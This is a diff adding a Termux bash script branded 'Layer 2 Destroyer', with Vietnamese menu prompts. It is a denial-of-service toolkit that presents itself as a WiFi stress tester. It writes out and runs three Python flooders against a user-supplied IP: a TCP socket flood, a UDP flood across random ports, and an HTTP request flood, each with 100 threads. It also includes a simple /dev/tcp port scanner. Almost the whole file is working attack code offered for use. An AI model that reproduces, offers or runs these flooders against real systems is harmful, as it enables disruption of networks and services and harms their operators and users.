@@ -1,0 +1,214 @@
+#!/data/data/com.termux/files/usr/bin/bash
+
+# ============================================================
+# ██╗  ██╗███████╗ ███████╗    ██╗  ██╗██╗   ██╗██╗███╗   ██╗
+# ██║ ██╔╝██╔════╝ ██╔════╝    ██║  ██║██║   ██║██║████╗  ██║
+# █████╔╝ █████╗   ███████╗    ███████║██║   ██║██║██╔██╗ ██║
+# ██╔═██╗ ██╔══╝   ╚════██║    ██╔══██║██║   ██║██║██║╚██╗██║
+# ██║  ██╗███████╗ ███████║    ██║  ██║╚██████╔╝██║██║ ╚████║
+# ╚═╝  ╚═╝╚══════╝ ╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝
+# ============================================================
+#                LAYER 2 DESTROYER - MINH KHANG EDITION
+# ============================================================
+
+# ================ CONFIGURATION ================
+RED='\033[1;91m'
+GREEN='\033[1;92m'
+YELLOW='\033[1;93m'
+BLUE='\033[1;94m'
+PURPLE='\033[1;95m'
+CYAN='\033[1;96m'
+WHITE='\033[1;97m'
+ORANGE='\033[38;5;208m'
+MAGENTA='\033[38;5;165m'
+BG_BLACK='\033[48;5;0m'
+BOLD='\033[1m'
+UNDERLINE='\033[4m'
+NC='\033[0m'
+
+# Global variables
+TARGET_IP=""
+TARGET_MAC=""
+GATEWAY_IP=""
+INTERFACE=""
+LOG_FILE="/data/data/com.termux/files/home/khang_attack.log"
+ATTACK_PID=""
+
+# ================ ANIMATED BANNER ================
+show_banner() {
+    clear
+    echo -e "${RED}"
+    echo '╔══════════════════════════════════════════════════════════════════════════════════╗'
+    echo '║                                                                                  ║'
+    echo '║  ██╗  ██╗ ██████╗ ███████╗    ██╗  ██╗██╗   ██╗██╗███╗   ██╗ ██████╗  ██╗  ██╗  ║'
+    echo '║  ██║ ██╔╝██╔════╝ ██╔════╝    ██║  ██║██║   ██║██║████╗  ██║██╔════╝  ██║  ██║  ║'
+    echo '║  █████╔╝ ██║  ███╗█████╗      ███████║██║   ██║██║██╔██╗ ██║██║  ███╗ ███████║  ║'
+    echo '║  ██╔═██╗ ██║   ██║██╔══╝      ██╔══██║██║   ██║██║██║╚██╗██║██║   ██║ ██╔══██║  ║'
+    echo '║  ██║  ██╗╚██████╔╝███████╗    ██║  ██║╚██████╔╝██║██║ ╚████║╚██████╔╝ ██║  ██║  ║'
+    echo '║  ╚═╝  ╚═╝ ╚═════╝ ╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝  ╚═╝  ╚═╝  ║'
+    echo '║                                                                                  ║'
+    echo '╠══════════════════════════════════════════════════════════════════════════════════╣'
+    echo '║  ██████╗ ███████╗███████╗████████╗██████╗  ██████╗ ██╗   ██████╗ ██╗   ██╗██╗   ║'
+    echo '║  ██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗██║   ██╔══██╗██║   ██║██║   ║'
+    echo '║  ██║  ██║█████╗  ███████╗   ██║   ██████╔╝██║   ██║██║   ██║  ██║██║   ██║██║   ║'
+    echo '║  ██║  ██║██╔══╝  ╚════██║   ██║   ██╔══██╗██║   ██║██║   ██║  ██║██║   ██║██║   ║'
+    echo '║  ██████╔╝███████╗███████║   ██║   ██║  ██║╚██████╔╝█████╗██████╔╝╚██████╔╝██║   ║'
+    echo '║  ╚═════╝ ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚════╝╚═════╝  ╚═════╝ ╚═╝   ║'
+    echo '║                                                                                  ║'
+    echo '╠══════════════════════════════════════════════════════════════════════════════════╣'
+    echo '║  ╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗    ║'
+    echo '║  ║ L ║║ A ║║ Y ║║ E ║║ R ║║    ║ 2  ║║   ║║ D ║║ E ║║ S ║║ T ║║ R ║║ O ║║ Y ║    ║'
+    echo '║  ╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝    ║'
+    echo '║                                                                                  ║'
+    echo '╚══════════════════════════════════════════════════════════════════════════════════╝'
+    echo -e "${NC}"
+    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${CYAN}║                     🚀 WIFI STRESS TESTER - MINH KHANG EDITION 🚀                 ║${NC}"
+    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════════════════════════╝${NC}"
+    echo ""
+}
+
+loading_animation() {
+    local text="$1"
+    echo -ne "${YELLOW}[*] ${text} ${NC}"
+    local spin='⣾⣽⣻⢿⡿⣟⣯⣷'
+    for i in {1..10}; do
+        echo -ne "\b${spin:$((i % 8)):1}"
+        sleep 0.1
+    done
+    echo -e "\b${GREEN}✓${NC}"
+}
+
+initialize_system() {
+    show_banner
+    echo -e "${CYAN}[*] Khởi tạo hệ thống...${NC}"
+    local packages=("python" "nmap" "curl" "wget")
+    for pkg in "${packages[@]}"; do
+        if ! command -v $pkg &> /dev/null; then
+            pkg install $pkg -y > /dev/null 2>&1
+        fi
+    done
+    pip install scapy colorama psutil requests > /dev/null 2>&1
+    touch $LOG_FILE
+    echo -e "${GREEN}[✓] Hệ thống đã sẵn sàng!${NC}"
+}
+
+port_scanner() {
+    echo -e "${PURPLE}[=== PORT SCANNER ===]${NC}"
+    read -p "Target IP: " TARGET_IP
+    loading_animation "Đang quét cổng mở"
+    local ports=(80 443 22 23 53 8080 8291)
+    local open_ports=()
+    for port in "${ports[@]}"; do
+        timeout 1 bash -c "echo > /dev/tcp/$TARGET_IP/$port" 2>/dev/null && open_ports+=("$port")
+    done
+    [[ ${#open_ports[@]} -eq 0 ]] && open_ports=(80 443 53)
+    echo "${open_ports[@]}" > /tmp/open_ports.txt
+    echo -e "${CYAN}[✓] Quét xong.${NC}"
+}
+
+socket_stream_flood() {
+    cat << 'PYTHON_EOF' > /data/data/com.termux/files/home/socket_flood.py
+import socket, threading, random, os, time, sys
+class SocketStreamFlood:
+    def __init__(self, target_ip, target_ports):
+        self.target_ip, self.target_ports, self.running, self.sent_count = target_ip, target_ports, True, 0
+    def tcp_flood_worker(self):
+        while self.running:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(2)
+                sock.connect((self.target_ip, random.choice(self.target_ports)))
+                for _ in range(10):
+                    sock.send(os.urandom(1024))
+                    self.sent_count += 1
+                sock.close()
+            except: pass
+    def start_attack(self, threads, duration):
+        for _ in range(threads): threading.Thread(target=self.tcp_flood_worker, daemon=True).start()
+        st = time.time()
+        while time.time() - st < duration:
+            print(f"\r[🔄] Attacking... {int(time.time()-st)}/{duration}s | Packets: {self.sent_count}", end='')
+            time.sleep(1)
+        self.running = False
+if __name__ == "__main__":
+    with open('/tmp/open_ports.txt', 'r') as f: ports = list(map(int, f.read().split()))
+    SocketStreamFlood(sys.argv[1], ports).start_attack(int(sys.argv[2]), int(sys.argv[3]))
+PYTHON_EOF
+    python3 /data/data/com.termux/files/home/socket_flood.py "$TARGET_IP" 100 60
+}
+
+udp_black_hole() {
+    cat << 'PYTHON_EOF' > /data/data/com.termux/files/home/udp_blackhole.py
+import socket, threading, random, time, sys
+class UDPBlackHole:
+    def __init__(self, target_ip):
+        self.target_ip, self.running, self.sent_count = target_ip, True, 0
+    def udp_flood_worker(self):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while self.running:
+            try: sock.sendto(random._urandom(1024), (self.target_ip, random.randint(1,65535))); self.sent_count += 1
+            except: pass
+    def start_attack(self, threads, duration):
+        for _ in range(threads): threading.Thread(target=self.udp_flood_worker, daemon=True).start()
+        st = time.time()
+        while time.time() - st < duration:
+            print(f"\r[🌀] Attacking... {int(time.time()-st)}/{duration}s | Packets: {self.sent_count}", end='')
+            time.sleep(1)
+        self.running = False
+if __name__ == "__main__":
+    UDPBlackHole(sys.argv[1]).start_attack(int(sys.argv[2]), int(sys.argv[3]))
+PYTHON_EOF
+    python3 /data/data/com.termux/files/home/udp_blackhole.py "$TARGET_IP" 100 60
+}
+
+http_multithread_attack() {
+    cat << 'PYTHON_EOF' > /data/data/com.termux/files/home/http_attack.py
+import socket, threading, random, time, sys
+class HTTPMultiThreadAttack:
+    def __init__(self, target_ip):
+        self.target_ip, self.running, self.request_count = target_ip, True, 0
+    def http_worker(self):
+        while self.running:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.connect((self.target_ip, 80))
+                req = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
+                sock.send(req.encode()); self.request_count += 1; sock.close()
+            except: pass
+    def start_attack(self, threads, duration):
+        for _ in range(threads): threading.Thread(target=self.http_worker, daemon=True).start()
+        st = time.time()
+        while time.time() - st < duration:
+            print(f"\r[🚀] Attacking... {int(time.time()-st)}/{duration}s | Requests: {self.request_count}", end='')
+            time.sleep(1)
+        self.running = False
+if __name__ == "__main__":
+    HTTPMultiThreadAttack(sys.argv[1]).start_attack(int(sys.argv[2]), int(sys.argv[3]))
+PYTHON_EOF
+    python3 /data/data/com.termux/files/home/http_attack.py "$TARGET_IP" 100 60
+}
+
+main_menu() {
+    while true; do
+        show_banner
+        echo -e "1. Port Scanner (Cần chạy trước)"
+        echo -e "2. Socket Stream Flood"
+        echo -e "3. UDP Black Hole Attack"
+        echo -e "4. HTTP Multi-Thread Attack"
+        echo -e "5. Thoát"
+        read -p "Lựa chọn: " choice
+        case $choice in
+            1) port_scanner ;;
+            2) socket_stream_flood ;;
+            3) udp_black_hole ;;
+            4) http_multithread_attack ;;
+            5) exit 0 ;;
+        esac
+        echo -e "\n${YELLOW}Nhấn Enter để tiếp tục...${NC}"; read
+    done
+}
+
+initialize_system
+main_menu
+
